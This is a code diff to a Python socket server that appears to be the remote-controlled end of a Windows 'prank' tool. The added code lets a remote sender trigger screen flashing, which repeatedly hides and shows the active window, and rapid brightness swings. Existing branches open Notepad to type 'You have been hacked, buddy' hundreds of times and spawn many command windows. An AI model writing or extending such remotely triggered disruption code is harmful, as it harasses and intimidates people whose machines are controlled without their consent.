@@ -1,6 +1,34 @@
+
+
+
 import socket
 import subprocess
 import time
+import ctypes
+import win32gui
+import win32con
+import pyautogui
+import screen_brightness_control as sbc
+
+def flash_screen():
+    try:
+        for _ in range(100):  # Flash 10 times
+            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
+            time.sleep(0.1)
+            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_SHOW)
+            time.sleep(0.1)
+    except Exception as e:
+        print(f"Error in flash_screen: {e}")
+
+def crazy_brightness():
+    try:
+        for _ in range(200):  # Loop to increase and decrease brightness
+            sbc.set_brightness(100)
+            time.sleep(0.2)
+            sbc.set_brightness(1)
+            time.sleep(0.2)
+    except Exception as e:
+        print(f"Error in crazy_brightness: {e}")
 
 def handle_client(client_socket):
     try:
@@ -35,7 +63,7 @@ def handle_client(client_socket):
                 time.sleep(1)  # Give Notepad some time to open
 
                 for _ in range(500):
-                    pyautogui.typewrite("You have been hacked, buddy 👾")
+                    pyautogui.typewrite("You have been hacked, buddy")
                     pyautogui.press("enter")
                 
                 print("[+] LOL prank executed successfully!")
@@ -48,6 +76,14 @@ def handle_client(client_socket):
                     time.sleep(0.2)  # Small delay to stagger openings
 
                 print("[+] CLI Hack executed successfully!")
+
+            elif data == "flashscreen":
+                print("[+] Flash Screen activated!")
+                flash_screen()
+
+            elif data == "crazybrightness":
+                print("[+] Crazy Brightness activated!")
+                crazy_brightness()
 
     except Exception as e:
         print(f"Error handling client: {e}")
